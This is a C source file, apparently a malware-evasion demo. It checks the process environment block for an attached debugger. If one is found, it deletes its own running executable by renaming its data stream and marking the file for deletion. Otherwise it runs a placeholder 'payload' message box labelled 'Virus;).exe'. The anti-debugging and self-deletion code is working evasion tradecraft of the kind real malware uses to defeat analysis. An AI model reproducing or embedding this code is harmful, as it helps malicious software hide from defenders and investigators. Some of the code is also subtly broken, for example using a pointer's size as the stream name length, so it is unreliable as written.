#include "Mylib.h"

#define NEW_STREAM L":S4L1M"

extern PTEB getTEB();
extern DWORD CustomError();
extern PPEB getPEB();
extern BYTE checkforDebug();

BOOL checkfordebugger(void) {


	warn("trying to access PEB");
	PPEB pPEB = getPEB();

	if (pPEB != NULL) {

		okay("we accessed PEB With succes");
	}

	BYTE checker = checkforDebug();

	if (checker == 1) {
		warn("debugger detected bye bye ");
		return TRUE;

	}

	okay("No debugger ;) ");
	return FALSE;

}

int Selfassini(void) {

	HANDLE                  hFile = INVALID_HANDLE_VALUE; // ONE OF THE ONLY HANDLES THAT USE INVALID_HANDLE
	const wchar_t* NEWSTREAM = (const wchar_t*)NEW_STREAM;
	size_t                  RenameSize = sizeof(FILE_RENAME_INFO) + sizeof(NEWSTREAM);
	PFILE_RENAME_INFO       PFRI = NULL;
	WCHAR                   PathSize[MAX_PATH * 2] = { 0 }; // [MAX_PATH * 2] BECAUSE OF WIDE CHARS
	FILE_DISPOSITION_INFO   SetDelete = { 0 };

	/*----------------------------------ALLOCATE BUFFER FOR FILE_RENAME_INFO ---------------------------------*/

	PFRI = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, RenameSize);

	if (PFRI == NULL) {

		warn("We can't alloc a heap and this is tho code error : \\ox%lx", CustomError());
		return EXIT_FAILURE;
	}

	okay(" memory allocated for RENAME_FILE_INFO : 0x%p",PFRI);
	info("we are cleaning some struct ");
	ZeroMemory(PathSize, sizeof(PathSize));
	ZeroMemory(&SetDelete, sizeof(SetDelete));
	okay("finished !!!!!");

	/*------------------[ activi deletion ]------------------*/
	info("setting file for deletion");
	SetDelete.DeleteFile = TRUE;
	okay("finished!");

	/*------------------[SET NEW DATA STREAM BUFFER & SIZE IN FILE_RENAME_INFO]------------------*/
	PFRI->FileNameLength = sizeof(NEWSTREAM);
	okay("set FILE_RENAME_INFO->FileNameLength to %s",NEWSTREAM);
	RtlCopyMemory(PFRI->FileName, NEWSTREAM, sizeof(NEWSTREAM));
	okay("overwrote FILE_RENAME_INFO->FileName with %s data stream", NEWSTREAM);
	okay("\\___[ FILE_RENAME_INFO->FileName\n\t\\___%s]", PFRI->FileName);

	/*------------------[GET CURRENT FILENAME]------------------*/
	info("getting current filename");
	if (GetModuleFileNameW(NULL, PathSize, MAX_PATH * 2) == 0) {
		warn("[GetModuleFileNameW] failed to get filename, error: 0x%lx", CustomError());
		return EXIT_FAILURE;
	}
	okay("finished!");

	/*------------------[GET  Handle To file]------------------*/
	info("starting the renaming process");
	info("getting handle to the current file");
	hFile = CreateFileW(PathSize, (DELETE | SYNCHRONIZE), FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		warn("[CreateFileW] failed to get a handle to the file, error: 0x%lx", CustomError());
		return EXIT_FAILURE;
	}
	okay("\\___[ hFile\n\t\\___0x%p]", hFile);
	info("renaming");

	/*------------------[Badal L asam]------------------*/
	if (!SetFileInformationByHandle(hFile, FileRenameInfo, PFRI, RenameSize))/*---->this line will set the new name of the file and its size  */ {
		warn("[SetFileInformationByHandle] failed to rewrite the data stream, error: 0x%lx", CustomError());
	}
	okay("finished!");
	info("closing handle to push the change");
	CloseHandle(hFile);
	okay("done! now beginning stage II");


	/*------------------[ Suprimmi 7anoni ]------------------*/
	info("getting handle to the current file, again");
	hFile = CreateFileW(PathSize, (DELETE | SYNCHRONIZE), FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL); /*t---->this line will set setDelete bool to true */
	if (hFile == INVALID_HANDLE_VALUE) {
		warn("[CreateFileW] failed to get a handle to the file, error: 0x%lx", CustomError());
		return EXIT_FAILURE;
	}
	okay("\\___[ hFile\n\t\\___0x%p]", hFile);

	info("marking the file for deletion");
	if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &SetDelete, sizeof(SetDelete))) {
		warn("[SetFileInformationByHandle] failed to mark file for deletion, error: 0x%lx", CustomError());
		return EXIT_FAILURE;
	}
	okay("finished!");
	info("closing handle to file, this should delete the file");

	CloseHandle(hFile);
	info("freeing the allocated heap buffer");
	HeapFree(GetProcessHeap(), 0, PFRI);

	return EXIT_SUCCESS;




}
int main(void) {

	BOOL checker = checkfordebugger();
	if (checker == FALSE) {

		okay("yeah yeah It's time for our Payload ");
		MessageBox(NULL, L"GG OUR payload runned with Succes ",L"Virus;).exe", (MB_HELP| MB_RETRYCANCEL));
		return EXIT_SUCCESS;

	}

	info("selfFassini process begin .......");
	Selfassini();
}